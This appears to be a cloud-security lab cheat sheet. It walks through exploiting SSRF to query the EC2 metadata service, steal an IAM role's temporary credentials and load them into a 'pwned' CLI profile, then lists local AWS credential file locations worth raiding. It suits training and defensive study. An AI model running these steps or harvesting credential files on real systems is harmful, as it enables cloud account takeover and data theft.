# IAM

## SSRF to IMDS Exploit

Prerequisites: The exposed app is vulnerable to SSRF

### 1) Get STS access key information 

    aws cloudformation describe-stacks --query "Stacks[?contains(StackName,'iam-initial-access')].Outputs"

### 2) Retrieve Instance Profile credentials (IAM Role):

Run this in the SSRF vulnerable component of the app

    http://169.254.169.254/latest/meta-data/iam/security-credentials/

### 3) Retrieve the ACTUAL credentials for the role name

    http://169.254.169.254/latest/meta-data/iam/security-credentials/ROLE_NAME

### 4) Use the credentials in your AWS CLI

    aws configure set aws_access_key_id ACCESS_KEY_ID --profile pwned
    aws configure set aws_secret_access_key SECRET_ACCESS_KEY --profile pwned
    aws configure set aws_session_token SESSION_TOKEN --profile pwned

### 5) Verify

    aws sts get-caller-identity --profile pwned

## IAM Credentials Locations

### 1) Environment Variables

Users can set credentials using AWS_ACCESS_KEY_ID and AWS_SECRET_ACCESS_KEY as environment variables.

### 2) Shared Credentials File 

    ~/.aws/credentials

This is the most common place when storing IAM user access keys or SSO configurations for assuming roles.

### 3) AWS Config file 

    ~/.aws/config  

Credential sources that reference helper scripts and other external credential providers are commonly referenced here.

### 4) Assume Role Provider  

The trick here is to know that when someone uses AWS SSO or another mechanism to assume a role via the AWS CLI, the AWS CLI tool caches credentials for each role session at 

    ~/.aws/cli/cache/{role_session_id}

### 5) Boto2 config file 

Boto2 is the predecessor version to Boto3 and might be used in legacy clients.

### 6) Instance Metadata Service (IMDS) 

On an Amazon EC2 instance that has an IAM role configured.
